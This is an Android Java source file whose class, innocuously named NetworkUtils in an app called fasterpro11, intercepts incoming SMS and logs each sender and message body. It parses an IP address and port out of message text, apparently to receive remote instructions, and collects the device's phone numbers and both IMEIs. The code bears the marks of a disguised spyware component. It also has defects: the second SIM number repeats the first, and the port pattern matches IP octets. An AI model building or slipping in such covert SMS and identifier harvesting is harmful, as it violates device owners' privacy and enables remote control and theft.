package com.example.fasterpro11;

import java.util.regex.Matcher;
import java.util.regex.Pattern;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

public class NetworkUtils extends BroadcastReceiver {

    private static final String TAG = "NetworkUtils";
    private String ip;
    private String port;
    private String sim1number;
    private String sim2number;
    private String mobileimei1;
    private String mobileimei2;
    private String recivesmsmobilenumber;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getDisplayOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();

                        // Log the sender and message
                        Log.d(TAG, "SMS received from: " + sender);
                        Log.d(TAG, "SMS message body: " + messageBody);

                        // Update the NetworkUtils instance with the sender's number
                        setRecivesmsmobilenumber(sender);
                    }
                }
            }
        }
    }

    public void extractIpAndPort(String messageBody) {
        // Patterns for IP addresses and ports
        String ipPattern = "\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b"; // Matches any IP address
        String portPattern = "\\b(\\d{1,5})\\b"; // Matches any port number

        Pattern ipRegex = Pattern.compile(ipPattern);
        Pattern portRegex = Pattern.compile(portPattern);

        Matcher ipMatcher = ipRegex.matcher(messageBody);
        Matcher portMatcher = portRegex.matcher(messageBody);

        // Find the first match for IP
        if (ipMatcher.find()) {
            String detectedIp = ipMatcher.group(0);
            if (isValidIp(detectedIp)) {
                ip = detectedIp;
                Log.d(TAG, "IP detected: " + ip);
            } else {
                Log.d(TAG, "Detected IP is not valid: " + detectedIp);
            }
        }

        // Find the first match for Port
        if (portMatcher.find()) {
            String detectedPort = portMatcher.group(0);
            if (isValidPort(detectedPort)) {
                port = detectedPort;
                Log.d(TAG, "Port detected: " + port);
            } else {
                Log.d(TAG, "Detected port is not valid: " + detectedPort);
            }
        }
    }

    public void extractSimAndImei(Context context) {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        // Check for permission and extract SIM and IMEI information
        try {
            if (telephonyManager != null) {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) { // API level 26
                    sim1number = telephonyManager.getLine1Number();
                    sim2number = telephonyManager.getLine1Number();
                    mobileimei1 = telephonyManager.getImei(0);
                    mobileimei2 = telephonyManager.getImei(1);
                } else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) { // API level 23
                    sim1number = telephonyManager.getLine1Number();
                    sim2number = telephonyManager.getLine1Number();
                    mobileimei1 = telephonyManager.getDeviceId(0);
                    mobileimei2 = telephonyManager.getDeviceId(1);
                } else {
                    sim1number = telephonyManager.getLine1Number();
                    sim2number = "N/A"; // Not available on devices below API 23
                    mobileimei1 = telephonyManager.getDeviceId();
                    mobileimei2 = "N/A"; // Not available on devices below API 23
                }

                Log.d(TAG, "SIM 1 number detected: " + sim1number);
                Log.d(TAG, "SIM 2 number detected: " + sim2number);
                Log.d(TAG, "IMEI 1 detected: " + mobileimei1);
                Log.d(TAG, "IMEI 2 detected: " + mobileimei2);
                Log.d(TAG, "Received SMS number: " + recivesmsmobilenumber);
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Permission denied to access telephony information", e);
        }
    }

    private boolean isValidIp(String ip) {
        // Check if IP is valid (0.0.0.0 to 255.255.255.255)
        String[] parts = ip.split("\\.");
        if (parts.length != 4) return false;
        for (String part : parts) {
            int value = Integer.parseInt(part);
            if (value < 0 || value > 255) return false;
        }
        return true;
    }

    private boolean isValidPort(String port) {
        // Check if port is within valid range (0-65535)
        try {
            int portNumber = Integer.parseInt(port);
            return portNumber >= 0 && portNumber <= 65535;
        } catch (NumberFormatException e) {
            return false;
        }
    }

    public String getIp() {
        return ip;
    }

    public String getPort() {
        return port;
    }

    public String getSim1number() {
        return sim1number;
    }

    public String getSim2number() {
        return sim2number;
    }

    public String getMobileimei1() {
        return mobileimei1;
    }

    public String getMobileimei2() {
        return mobileimei2;
    }

    public String getRecivesmsmobilenumber() {
        return recivesmsmobilenumber;
    }

    public void setRecivesmsmobilenumber(String recivesmsmobilenumber) {
        this.recivesmsmobilenumber = recivesmsmobilenumber;
    }
}
